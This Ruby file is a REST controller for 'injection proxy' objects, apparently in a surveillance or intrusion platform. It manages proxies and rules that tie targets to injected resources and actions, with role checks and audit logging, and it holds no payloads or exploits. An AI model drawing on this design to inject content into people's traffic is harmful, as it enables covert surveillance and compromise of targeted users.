#
# Controller for the Proxy objects
#

module RCS
module DB

class ProxyController < RESTController

  def index
    require_auth_level :server, :admin, :tech

    mongoid_query do
      result = ::Proxy.all

      return RESTController.ok(result)
    end
  end

  def show
    require_auth_level :server, :admin, :tech

    mongoid_query do
      proxy = ::Proxy.find(params['proxy'])
      return RESTController.not_found if proxy.nil?
      return RESTController.ok(proxy)
    end
  end

  def create
    require_auth_level :admin

    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto')

    Audit.log :actor => @session[:user][:name], :action => 'proxy.create', :desc => "Created the injection proxy '#{@params['name']}'"

    return RESTController.ok(result)
  end

  def update
    require_auth_level :admin

    mongoid_query do
      proxy = Proxy.find(params['_id'])
      params.delete('_id')
      return RESTController.not_found if proxy.nil?

      params.each_pair do |key, value|
        if proxy[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => 'proxy.update', :desc => "Updated '#{key}' to '#{value}' for injection proxy '#{proxy['name']}'"
        end
      end

      proxy.update_attributes(params)

      return RESTController.ok(proxy)
    end
  end

  def destroy
    require_auth_level :admin

    mongoid_query do
      proxy = Proxy.find(params['_id'])

      Audit.log :actor => @session[:user][:name], :action => 'proxy.destroy', :desc => "Deleted the injection proxy '#{proxy.name}'"

      proxy.destroy
      return RESTController.ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      proxy = Proxy.find(params['_id'])
      params.delete('_id')
      return RESTController.not_found if proxy.nil?

      proxy.update_attributes(params)

      return RESTController.ok
    end
  end

  def config
    require_auth_level :server
    
    mongoid_query do
      proxy = ::Proxy.find(params['_id'])
      return RESTController.not_found if proxy.nil?

      #TODO: implement config retrieval

      proxy.configured = true
      proxy.save

      return RESTController.not_found
    end
  end

  def log
    require_auth_level :server

    time = Time.parse(params['time']).getutc.to_i

    mongoid_query do
      proxy = Proxy.find(params['_id'])

      entry = CappedLog.dynamic_new proxy[:_id]
      entry.time = time
      entry.type = params['type'].downcase
      entry.desc = params['desc']
      entry.save

      return RESTController.ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(params['_id'])
      return RESTController.not_found if proxy.nil?

      target = ::Item.find(params['target'])
      return RESTController.not_found if target.nil?

      rule = ::ProxyRule.new
      rule.enabled = params['enabled']
      rule.probability = params['probability']
      rule.disable_sync = params['disable_sync']
      rule.ident = params['ident']
      rule.ident_param = params['ident_param']
      rule.resource = params['resource']
      rule.action = params['action']
      rule.action_param = params['action_param']

      rule.target = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      rule[:_grid] = [ BSON::ObjectId.from_string(params['_grid']) ] unless params['_grid'].nil?
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.add_rule', :target => target.name,
                :desc => "Added a rule to the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      proxy.rules << rule
      proxy.save

      return RESTController.ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(params['_id'])
      return RESTController.not_found if proxy.nil?

      rule = proxy.rules.find(params['rule'])
      return RESTController.not_found if rule.nil?

      target = ::Item.find(rule.target.first)
      return RESTController.not_found if target.nil?

      Audit.log :actor => @session[:user][:name], :action => 'proxy.del_rule', :target => target.name,
                :desc => "Deleted a rule from the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"
      
      proxy.rules.delete_all(conditions: { _id: rule[:_id]})
      proxy.save

      return RESTController.ok
    end
  end

  def update_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(params['_id'])
      return RESTController.not_found if proxy.nil?

      target = ::Item.find(params['target'])
      return RESTController.not_found if target.nil?

      rule = proxy.rules.find(params['rule'])
      return RESTController.not_found if rule.nil?

      params.delete('_id')
      params.delete('target')
      params.delete('rule')
      params['target'] = [ target[:_id] ]
      rule.update_attributes(params)

      # the file is uploaded to the grid before calling this method
      rule[:_grid] = [ BSON::ObjectId.from_string(params['_grid']) ] unless params['_grid'].nil?

      rule.save

      Audit.log :actor => @session[:user][:name], :action => 'proxy.update_rule', :target => target.name,
                :desc => "Modified a rule on the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return RESTController.ok(rule)
    end
  end

  def apply_rules
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(params['_id'])
      return RESTController.not_found if proxy.nil?

      Audit.log :actor => @session[:user][:name], :action => 'proxy.apply_rules',
                :desc => "Applied the rules to the injection proxy '#{proxy.name}'"
      
      proxy.configured = false
      proxy.save

      return RESTController.ok
    end
  end

end

end #DB::
end #RCS::
